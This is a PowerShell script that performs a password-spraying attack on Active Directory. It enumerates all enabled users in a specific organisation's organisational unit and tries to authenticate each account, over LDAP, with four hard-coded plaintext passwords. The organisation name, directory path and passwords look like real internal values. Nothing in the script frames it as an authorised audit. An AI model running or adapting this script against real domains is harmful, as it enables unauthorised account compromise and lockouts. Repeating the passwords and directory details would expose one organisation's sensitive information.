function Test-Cred {
           
    [CmdletBinding()]
    [OutputType([String])] 
       
    Param ( 
        [Parameter( 
            Mandatory = $false, 
            ValueFromPipeLine = $true, 
            ValueFromPipelineByPropertyName = $true
        )] 
        [Alias( 
            'PSCredential'
        )] 
        [ValidateNotNull()] 
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()] 
        $Credentials
    )
    $Domain = $null
    $Root = $null
    $Username = $null
    $Password = $null
      
    If($Credentials -eq $null)
    {
        Try
        {
            $Credentials = Get-Credential "domain\$env:username" -ErrorAction Stop
        }
        Catch
        {
            $ErrorMsg = $_.Exception.Message
            Write-Warning "Failed to validate credentials: $ErrorMsg "
            Pause
            Break
        }
    }
      
    # Checking module
    Try
    {
        # Split username and password
        $Username = $credentials.username
        $Password = $credentials.GetNetworkCredential().password
  
        # Get Domain
        $Root = "LDAP://" + ([ADSI]'').distinguishedName
        $Domain = New-Object System.DirectoryServices.DirectoryEntry($Root,$UserName,$Password)
    }
    Catch
    {
        $_.Exception.Message
        Continue
    }
  
    If(!$domain)
    {
        Write-Warning "Something went wrong"
    }
    Else
    {
        If ($domain.name -ne $null)
        {
            return "Authenticated"
        }
        Else
        {
            return "Not authenticated"
        }
    }
}

$usersWarsaw =get-aduser -filter * -SearchBase "OU=Users,OU=CEE,OU=Vistra,DC=work,DC=local" | where {$_.enabled -eq "true"}

$plaintextPasswords = "Dingo123","Vistra2019","Rakieta123!"
$password1 = ConvertTo-SecureString 'Dingo123' -AsPlainText -Force
$password2 = ConvertTo-SecureString 'Vistra2019' -AsPlainText -Force
$password3 = ConvertTo-SecureString 'Vistra2020' -AsPlainText -Force
$password4 = ConvertTo-SecureString 'Rakieta123!' -AsPlainText -Force

$result = foreach ($user in $usersWarsaw){
   $user.Name
   $credential = New-Object System.Management.Automation.PSCredential ($user.samaccountname, $password1)
   Test-Cred $credential
   $credential = New-Object System.Management.Automation.PSCredential ($user.samaccountname, $password2)
   Test-Cred $credential
   $credential = New-Object System.Management.Automation.PSCredential ($user.samaccountname, $password3)
   Test-Cred $credential
   $credential = New-Object System.Management.Automation.PSCredential ($user.samaccountname, $password4)
   Test-Cred $credential
}

$result | Out-GridView



